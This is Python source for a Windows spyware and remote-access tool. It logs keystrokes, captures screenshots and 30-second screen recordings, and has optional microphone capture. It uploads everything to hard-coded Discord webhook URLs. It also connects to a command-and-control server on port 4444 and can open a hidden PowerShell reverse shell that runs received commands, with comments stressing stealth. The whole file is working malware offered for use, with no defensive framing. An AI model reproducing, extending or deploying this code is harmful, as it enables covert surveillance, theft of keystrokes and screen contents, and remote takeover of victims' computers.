import cv2
import mss
import numpy as np
import os
import tempfile
import requests
import time
#import pyaudio
import wave
from pynput import keyboard
import schedule
import socket
import subprocess
import threading
import sys

# ==================== CONFIG ====================
SCREEN_WEBHOOK_URL = "https://discord.com/api/webhooks/1252261362097192961/p0tzj_iJN8c-Iv3AdvPA-oNQBBwnzFnbRLAE5ibTCWvH93IMBxW3TarBbO1VNLAhMLTI"
AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1259623619332411524/KdAhb0i7oTwfaFsHfhYfQJda5Cx7DgS5S7c27Fan_LAxN25A3KbPq3wqgaVY1vI_Eome"
KEYLOGGER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1246901796782473329/rcIggVdzfYRUJVYMjJgZcRrc3Z8fWjEWEm83dmxB48kpM1erU04lp7GBX4CSlqy9rn5x'
SCREENSHOT_WEBHOOK_URL = 'https://discord.com/api/webhooks/1244445585373794325/ZIlEfyS5C1HBedpugnAq_lOxgi538WzXQFszdga4SbPRzbILEfivhECVTNNRS2NCC6-5'

C2_IP  = "192.168.122.23"   # your server IP
C2_PORT = 4444

KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"
recording_active = True

# ==================== CORE FUNCTIONS ====================
def send_to_discord(file_path, webhook_url):
    with open(file_path, "rb") as file:
        response = requests.post(webhook_url, files={"file": file})
    return response.status_code

def record_screen(output_path, record_time=30, fps=8):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width, height = monitor["width"], monitor["height"]
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        for _ in range(record_time * fps):
            sct_img = sct.grab(monitor)
            frame = cv2.cvtColor(np.array(sct_img), cv2.COLOR_BGRA2BGR)
            out.write(frame)
        out.release()

# Audio recording – kept but commented out in main loop
def record_audio(output_path, record_time=30, channels=1, rate=16000, chunk=1024):
    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=channels,
                        rate=rate, input=True, frames_per_buffer=chunk)
    frames = [stream.read(chunk) for _ in range(int(rate / chunk * record_time))]
    stream.stop_stream(); stream.close(); audio.terminate()
    with wave.open(output_path, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

# ==================== KEYLOGGER ====================
ignored_keys = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
    keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.cmd_l,
    keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
    keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l,
    keyboard.Key.tab, keyboard.Key.esc, keyboard.Key.space,
    keyboard.Key.backspace, keyboard.Key.enter
}
last_key_pressed = None

def key_press(key):
    global last_key_pressed
    try:
        if key != last_key_pressed:
            with open(KEYLOG_PATH, 'a') as logKey:
                if hasattr(key, 'char') and key.char is not None:
                    logKey.write(key.char)
                elif key not in ignored_keys:
                    logKey.write(f'[{key}]')
        last_key_pressed = key
    except: pass

def key_release(key):
    global last_key_pressed
    last_key_pressed = None

def send_keylog_to_discord():
    try:
        with open(KEYLOG_PATH, 'rb') as file:
            response = requests.post(KEYLOGGER_WEBHOOK_URL,
                                     data={'content': 'Keylog file'},
                                     files={'file': file})
            print("Keylog sent." if response.status_code == 200 else f"Failed: {response.status_code}")
    except Exception as e:
        print(f"Keylog error: {e}")

def ensure_ss_folder_exists():
    dir_ = os.path.join(tempfile.gettempdir(), 'ss')
    os.makedirs(dir_, exist_ok=True)
    return dir_

def take_screenshot(output_path):
    with mss.mss() as sct:
        sct.shot(mon=-1, output=output_path)

def send_screenshot_to_discord(output_path, webhook_url):
    take_screenshot(output_path)
    status = send_to_discord(output_path, webhook_url)
    print("Screenshot sent." if status == 200 else f"Screenshot failed: {status}")

def scheduled_screenshots():
    send_screenshot_to_discord(os.path.join(ensure_ss_folder_exists(), 'screenshot.png'),
                               SCREENSHOT_WEBHOOK_URL)

# ==================== STEALTH C2 SHELL (NO COMMAND-LINE SCRIPT) ====================
def interactive_shell(sock):
    """Spawn a hidden PowerShell, feed script via stdin – no base64, no encoded command."""
    try:
        # The PowerShell script is fed through stdin – never appears on command line.
        ps_script = '''
$ErrorActionPreference = "Stop"
while ($true) {
    $cmd = Read-Host
    if ($cmd -eq "exit") { break }
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        if ($output -eq "") { $output = "Command executed successfully." }
    } catch {
        $output = $_.Exception.Message
    }
    Write-Output $output
}
'''
        creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        p = subprocess.Popen(
            ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=creationflags
        )

        # Feed the script to PowerShell's stdin
        p.stdin.write(ps_script.encode())
        p.stdin.flush()

        # Thread to read PowerShell output and send to socket
        def read_output():
            while True:
                out = p.stdout.read(4096)
                if not out:
                    break
                sock.send(out)

        threading.Thread(target=read_output, daemon=True).start()

        # Relay commands from socket to PowerShell stdin
        while True:
            data = sock.recv(4096)
            if not data:
                break
            p.stdin.write(data)   # data already includes newline from server
            p.stdin.flush()

        p.terminate()
    except Exception as e:
        sock.send(f"Shell error: {e}\n".encode())

def c2_handler():
    global recording_active
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            s.send(b"[+] Connected to C2 server\n")
            print("[C2] Connected.")

            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    break
                cmd = data.lower()
                if cmd == "start":
                    recording_active = True
                    s.send(b"[+] Recording started\n")
                elif cmd == "stop":
                    recording_active = False
                    s.send(b"[+] Recording stopped\n")
                elif cmd == "shell":
                    s.send(b"[+] Spawning shell...\n")
                    interactive_shell(s)
                    s.send(b"[+] Shell closed\n")
                elif cmd == "exit":
                    s.send(b"[+] Exiting\n")
                    os._exit(0)
                else:
                    s.send(b"Unknown command. Available: start, stop, shell, exit\n")
        except Exception as e:
            print(f"[C2] Error: {e}. Reconnecting in 5s...")
            time.sleep(5)
        finally:
            try:
                s.close()
            except:
                pass

# ==================== MAIN ====================
if __name__ == "__main__":
    if not os.path.exists(KEYLOG_PATH):
        open(KEYLOG_PATH, 'a').close()

    keyboard.Listener(on_press=key_press, on_release=key_release).start()

    threading.Thread(target=c2_handler, daemon=True).start()
    print("[C2] Thread started.")

    schedule.every(1).minute.do(send_keylog_to_discord)
    schedule.every(30).seconds.do(scheduled_screenshots)

    clip_number = 1
    while True:
        schedule.run_pending()
        if recording_active:
            # Screen recording
            try:
                temp_dir = tempfile.gettempdir()
                path = os.path.join(temp_dir, f"screen_record_{clip_number}.mp4")
                record_screen(path, record_time=30)
                if send_to_discord(path, SCREEN_WEBHOOK_URL) == 200:
                    os.remove(path)
                    clip_number += 1
                else:
                    time.sleep(5)
            except Exception as e:
                print(f"Screen error: {e}")
                time.sleep(5)

            # Audio recording (commented out)
            # try:
            #     path = os.path.join(temp_dir, f"voice_record_{clip_number}.wav")
            #     record_audio(path, record_time=30)
            #     if send_to_discord(path, AUDIO_WEBHOOK_URL) == 200:
            #         os.remove(path)
            #         clip_number += 1
            #     else:
            #         time.sleep(5)
            # except Exception as e:
            #     print(f"Audio error: {e}")
            #     time.sleep(5)

        time.sleep(1)

